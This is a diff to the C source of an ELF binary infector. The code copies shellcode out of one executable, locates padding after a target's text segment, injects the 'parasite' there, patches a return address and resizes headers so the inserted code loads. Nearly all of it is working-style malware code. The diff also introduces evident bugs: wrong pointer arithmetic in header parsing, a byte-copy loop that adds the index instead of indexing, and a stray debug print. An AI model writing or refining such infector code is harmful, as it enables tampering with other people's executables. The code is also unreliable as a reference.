@@ -11,13 +11,14 @@
 #include <stdbool.h>
 #include <sys/stat.h>
 #include <sys/mman.h>
+#include <sys/user.h>
 
 #define DEBUG
 
 static int shellcode_patch_ret_address(struct Shellcode *this,  \
         Elf64_Addr addr)
 {
-    for(int i = 0; i < this->m_size; i++){
+    for(int i = 0; i < this->m_shellcode_size; i++){
         if(*((uint8_t *)this->m_shellcode + i) == 0x55 &&       \
                 *((uint8_t *)this->m_shellcode + (i+1)) == 0x99){
 #ifdef DEBUG
@@ -44,21 +45,20 @@ static int shellcode_patch_ret_address(struct Shellcode *this,  \
 
 static int shellcode_extract_section(Shellcode *this, int index)
 {
-    this->m_size = (this->m_elf->m_shdr[index].sh_size + 8);
-    this->m_shellcode = malloc(sizeof(uint8_t) * this->m_size);
-    if(this->m_shellcode == NULL){
-        fprintf(stderr, "memory allocation failed\n");
-        goto err1;
+    this->m_shellcode_size = (this->m_elf->m_shdr[index].sh_size);
+    this->m_shellcode = malloc(sizeof(char) * this->            \
+            m_shellcode_size);
+    if(this->m_shellcode == NULL) {
+        goto err;
     }
 
-    memset(this->m_shellcode, 0, this->m_size);
-    memcpy(this->m_shellcode, &this->m_elf->m_map[this->        \
-            m_elf->m_shdr[index].sh_offset], this->m_elf->m_shdr\
-            [index].sh_size);
+    memset(this->m_shellcode, 0, this->m_shellcode_size);
+    memcpy(this->m_shellcode, (this->m_elf->m_map + this->m_elf \
+        ->m_shdr[index].sh_offset), this->m_shellcode_size);
 
     return 0;
 
-err1:
+err:
     return -1;
 }
 
@@ -107,9 +107,9 @@ err:
 static void target_insert_shellcode(Target *this, Shellcode     \
         *shellcode)
 {
-    for(int i = 0; i < shellcode->m_size; i++){
-        this->m_elf->m_map[this->text_end + i] = (*((uint8_t *) \
-            shellcode->m_shellcode) + i);
+    for(int i = 0; i < shellcode->m_shellcode_size; i++){
+        (*(uint8_t *)(this->m_elf->m_map + (this->text_end +    \
+            i))) = (*((uint8_t *) shellcode->m_shellcode) + i);
     }
 }
 
@@ -123,7 +123,7 @@ static void target_adjust_sections(Target *this, int parasite_size)
              * increase offset of every section after infected one
              * by PAGE_SIZE
              */
-            this->m_elf->m_shdr[i].sh_offset += PF_HP_PAGE_SIZE;
+            this->m_elf->m_shdr[i].sh_offset += PAGE_SIZE;
         } else {
             /* 
              * if sh_addr + sh_size == parasite_addr, we are at 
@@ -133,8 +133,7 @@ static void target_adjust_sections(Target *this, int parasite_size)
              */
             if(this->m_elf->m_shdr[i].sh_addr + this->m_elf->   \
                     m_shdr[i].sh_size == this->parasite_addr){
-                this->m_elf->m_shdr[i].sh_size +=               \
-                    parasite_size;
+                this->m_elf->m_shdr[i].sh_size += parasite_size;
             }
         }
     }
@@ -167,6 +166,8 @@ static int target_find_free_space(Target *this, int parasite_size)
             this->parasite_addr = this->m_elf->m_phdr[i].       \
                 p_vaddr + this->text_filesize;
 
+            printf("parasite address %lx\n", this->parasite_addr);
+
             /* resizing p_filesz and p_memsz */
             this->m_elf->m_phdr[i].p_filesz += parasite_size;
             this->m_elf->m_phdr[i].p_memsz += parasite_size;
@@ -174,7 +175,7 @@ static int target_find_free_space(Target *this, int parasite_size)
 
         } else if (this->m_elf->m_phdr[i].p_type == PT_LOAD &&  \
             (this->m_elf->m_phdr[i].p_offset - this->text_end)  \
-            < parasite_size && text_found){
+            > parasite_size && text_found){
             this->available_freespace = this->m_elf->m_phdr[i]. \
                 p_offset - this->text_end;
 
@@ -183,7 +184,6 @@ static int target_find_free_space(Target *this, int parasite_size)
                     available_freespace);
 #endif
             text_found = false;
-
         }
     }
 
@@ -196,8 +196,8 @@ static int elf_get_section_index_by_name(Elf *elf, const char   \
 {
     /* first we have to parse shstrtab */
     Elf64_Shdr *section = &elf->m_shdr[elf->m_ehdr->e_shstrndx];
-    char *shstrtab = (char *)&elf->m_map[section->sh_offset];
-
+    char *shstrtab = (char *)(elf->m_map + section->sh_offset);
+puts("2");
     for(int i = 0; i < elf->m_ehdr->e_shnum; i++){
         if(strcmp(&shstrtab[elf->m_shdr[i].sh_name],            \
                     section_name) == 0){
@@ -212,10 +212,10 @@ static int elf_get_section_index_by_name(Elf *elf, const char   \
 static void elf_parse_headers(Elf *elf)
 {
     elf->m_ehdr = (Elf64_Ehdr *) elf->m_map;
-    elf->m_phdr = (Elf64_Phdr *) &elf->m_map[elf->m_ehdr->      \
-        e_phoff];
-    elf->m_shdr = (Elf64_Shdr *) &elf->m_map[elf->m_ehdr->      \
-        e_shoff];
+    elf->m_phdr = (Elf64_Phdr *) elf->m_map + elf->m_ehdr->     \
+        e_phoff;
+    elf->m_shdr = (Elf64_Shdr *) elf->m_map + elf->m_ehdr->     \
+        e_shoff;
 }
 
 static bool elf_is_elf(Elf *elf)
@@ -228,9 +228,11 @@ static bool elf_is_elf(Elf *elf)
         goto err;
     }
 
-    if(elf->m_map[0] != 0x7f || elf->m_map[1] != 'E' ||         \
-            elf->m_map[2] != 'L' || elf->m_map[3] != 'F'){
-#ifdef DEBUG
+    uint8_t *ptr = (uint8_t *)elf->m_map;
+    if(ptr[0] != 0x7f || ptr[1] != 'E' || ptr[2] != 'L' ||      \
+            ptr[3] != 'F'){
+
+#ifdef DEBUG 
         fprintf(stderr, "not an elf binary\n");
 #endif
         goto err;
@@ -295,6 +297,7 @@ Elf *ElfConstructor(const char *filename)
 {
     Elf *elf = malloc(sizeof(Elf));
     if(elf == NULL){
+
 #ifdef DEBUG
         fprintf(stderr, "memory allocation failed\n");
 #endif
@@ -321,6 +324,7 @@ void ElfDestructor(Elf *this)
 {
     if(this->m_map != NULL){
         if(munmap(this->m_map, this->m_size) < 0){
+
 #ifdef DEBUG
             fprintf(stderr, "memory unmap failed\n");
 #endif
@@ -383,6 +387,7 @@ Shellcode *ShellcodeConstructor(const char *filename)
 {
     Shellcode *shellcode = malloc(sizeof(Shellcode));
     if(shellcode == NULL){
+
 #ifdef DEBUG
         fprintf(stderr, "memory allocation error\n");
 #endif
